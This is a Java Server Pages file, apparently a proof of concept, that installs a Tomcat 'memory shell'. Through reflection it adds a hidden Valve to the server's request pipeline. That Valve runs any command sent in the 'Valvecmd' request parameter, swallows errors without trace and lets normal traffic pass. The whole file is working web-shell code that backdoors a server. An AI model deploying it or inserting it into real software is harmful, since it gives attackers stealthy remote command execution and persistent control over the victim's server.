<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.Pipeline" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="javax.servlet.ServletException" %>
<%@ page import="java.io.IOException" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
    Pipeline pipeline = standardContext.getPipeline();
%>

<%!
    class ValveTest extends ValveBase {
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("Valvecmd");
            if (cmd != null && !cmd.isEmpty()) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (Exception e) {
                    // 异常静默处理
                }
            }
            // 关键：传递请求给后续Valve处理
            getNext().invoke(request, response);
        }
    }
%>

<%
    // 防止重复添加Valve
    if (pipeline.getValves().length == 0 || !pipeline.getValves()[0].getClass().getName().contains("ValveTest")) {
        pipeline.addValve(new ValveTest());
    }
%>
